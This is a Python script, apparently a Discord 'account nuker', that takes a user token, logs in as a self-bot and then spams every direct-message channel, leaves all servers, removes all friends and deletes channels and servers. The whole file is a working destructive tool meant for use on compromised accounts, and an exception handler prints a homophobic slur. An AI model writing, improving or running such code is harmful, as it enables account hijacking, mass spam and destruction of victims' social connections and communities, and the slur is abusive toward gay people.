from subprocess import call
import platform
try:
    from colorama import Fore, init
    import requests
    import discord
except:
    print("Coudln't import all needed modules, Yikes")

guildsIds = []
friendsIds = []
channelIds = []

class Login(discord.Client):
    async def on_connect(self):
        for g in self.guilds:
            guildsIds.append(g.id)
 
        for f in self.user.friends:
            friendsIds.append(f.id)

        for c in self.private_channels:
            channelIds.append(c.id)

        await self.logout()

    def run(self, token):
        try:
            super().run(token, bot=False)
        except:
            print('Kys faggot')

def clear():
    if platform.system() == 'Windows':
        call(['cls'], shell=True)
    else:
        call(['clear'], shell=True)


def nuker(token:str, message:str):
    Login().run(token)
    try:
        for id in channelIds:
            requests.post(f'https://discord.com/api/v8/channels/{id}/messages', headers={'authorization': token}, data={"content": message})
    except Exception as e:
        print(f'Error detected, ignoring. {e}')

    try:
        for guild in guildsIds:
            requests.delete(f'https://discord.com/api/v8/users/@me/guilds/{guild}', headers={'authorization': token})
    except Exception as e:
        print(f'Error detected, ignoring. {e}')

    try:
        for friend in friendsIds:
            requests.delete(f'https://discord.com/api/v8/users/@me/relationships/{friend}', headers={'authorization': token})
    except Exception as e:
        print(f'Error detected, ignoring. {e}')

    try:
        for id in channelIds:
            requests.delete(f'https://discord.com/api/v8/channels/{id}', headers={'authorization': token})
    except Exception as e:
        print(f'Error detected, ignoring. {e}')

    try:
        for guild in guildsIds:
            requests.delete(f'https://discord.com/api/v8/guilds/{guild}', headers={'authorization': token})
    except Exception as e:
        print(f'Error detected, ignoring. {e}')

def main():
    clear()
    print(f"""   
{Fore.RED}░░░░░░░░░░░░░░░▄▀▄░░░░░░░░░░░░░░░
░░░░░░░░░░░░░▄▀░░░▀▄░░░░░░░░░░░░░
░░░░░░░░░░░▄▀░░░░▄▀█░░░░░░░░░░░░░
░░░░░░░░░▄▀░░░░▄▀░▄▀░▄▀▄░░░░░░░░░
░░░░░░░▄▀░░░░▄▀░▄▀░▄▀░░░▀▄░░░░░░░
░░░░░░░█▀▄░░░░▀█░▄▀░░░░░░░▀▄░░░░░
░░░▄▀▄░▀▄░▀▄░░░░▀░░░░▄█▄░░░░▀▄░░░
░▄▀░░░▀▄░▀▄░▀▄░░░░░▄▀░█░▀▄░░░░▀▄░
░█▀▄░░░░▀▄░█▀░░░░░░░▀█░▀▄░▀▄░▄▀█░
░▀▄░▀▄░░░░▀░░░░▄█▄░░░░▀▄░▀▄░█░▄▀░
░░░▀▄░▀▄░░░░░▄▀░█░▀▄░░░░▀▄░▀█▀░░░
░░░░░▀▄░▀▄░▄▀░▄▀░█▀░░░░▄▀█░░░░░░░
░░░░░░░▀▄░█░▄▀░▄▀░░░░▄▀░▄▀░░░░░░░
░░░░░░░░░▀█▀░▄▀░░░░▄▀░▄▀░░░░░░░░░
░░░░░░░░░░░░░█▀▄░▄▀░▄▀░░░░░░░░░░░
░░░░░░░░░░░░░▀▄░█░▄▀░░░░░░░░░░░░░
░░░░░░░░░░░░░░░▀█▀░░░░░░░░░░░░░░░{Fore.RESET}
    """)
    token = input('Token: ')
    message = input('Message: ')

    req = requests.get('https://discordapp.com/api/v6/users/@me/library', headers={'authorization': token})
    if req.status_code == 200:
        nuker(token, message)
    else:
        print(f'{Fore.RED}Invalid{Fore.RESET} token')
        exit()
main()
